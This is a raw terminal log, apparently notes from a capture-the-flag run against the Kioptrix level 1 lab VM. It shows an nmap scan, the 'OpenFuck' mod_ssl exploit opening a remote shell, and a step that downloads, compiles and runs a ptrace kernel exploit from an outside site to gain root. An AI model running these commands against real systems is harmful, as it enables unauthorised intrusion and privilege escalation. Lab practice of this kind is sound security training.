@@ -1,0 +1,168 @@
+root@ap:~/Scrivania/CTF/Kioptrix_1# nmap -A -p- 192.168.43.219
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-14 22:49 CET
+Nmap scan report for 192.168.43.219
+Host is up (0.00057s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+|_ssl-date: 2020-01-14T22:34:05+00:00; +43m46s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 94:65:9C:AC:53:3C (Intel Corporate)
+Device type: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: 43m45s
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.57 ms 192.168.43.219
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 132.27 seconds
+
+
+
+
+Found Dirb:
+test.php
+
+
+
+cd mail
+ls -la
+total 4
+drwxrwxr-x    2 root     mail         1024 Jan 14 17:35 .
+drwxr-xr-x   14 root     root         1024 Sep 26  2009 ..
+-rw-rw----    1 harold   harold          0 Sep 26  2009 harold
+-rw-rw----    1 john     john            0 Sep 26  2009 john
+-rw-rw----    1 nfsnobod nfsnobod        0 Sep 26  2009 nfsnobody
+-rw-------    1 root     root         1529 Jan 14 17:35 root
+cat root
+From root  Sat Sep 26 11:42:10 2009
+Return-Path: <root@kioptix.level1>
+Received: (from root@localhost)
+	by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
+	for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
+Date: Sat, 26 Sep 2009 11:42:10 -0400
+From: root <root@kioptix.level1>
+Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
+To: root@kioptix.level1
+Subject: About Level 2
+Status: O
+
+If you are reading this, you got root. Congratulations.
+Level 2 won't be as easy...
+
+From root  Wed Aug 21 10:20:09 2019
+Return-Path: <root@kioptrix.level1>
+Received: (from root@localhost)
+	by kioptrix.level1 (8.11.6/8.11.6) id x7LEK9X01015
+	for root; Wed, 21 Aug 2019 10:20:09 -0400
+Date: Wed, 21 Aug 2019 10:20:09 -0400
+From: root <root@kioptrix.level1>
+Message-Id: <201908211420.x7LEK9X01015@kioptrix.level1>
+To: root@kioptrix.level1
+Subject: LogWatch for kioptrix.level1
+
+
+
+ ################## LogWatch 2.1.1 Begin ##################### 
+
+
+ ###################### LogWatch End ######################### 
+
+From root  Tue Jan 14 17:35:56 2020
+Return-Path: <root@kioptrix.level1>
+Received: (from root@localhost)
+	by kioptrix.level1 (8.11.6/8.11.6) id 00EMZtT01174
+	for root; Tue, 14 Jan 2020 17:35:55 -0500
+Date: Tue, 14 Jan 2020 17:35:55 -0500
+From: root <root@kioptrix.level1>
+Message-Id: <202001142235.00EMZtT01174@kioptrix.level1>
+To: root@kioptrix.level1
+Subject: LogWatch for kioptrix.level1
+
+
+
+ ################## LogWatch 2.1.1 Begin ##################### 
+
+
+ ###################### LogWatch End ######################### 
+
+
+
+
+root@ap:~/Scrivania/CTF/Kioptrix_1# ./OpenFuck 0x6b 192.168.43.219 443 -c 50
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
+--18:15:37--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--18:15:38--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   1.87 MB/s
+
+18:15:40 (1.25 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 28389
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
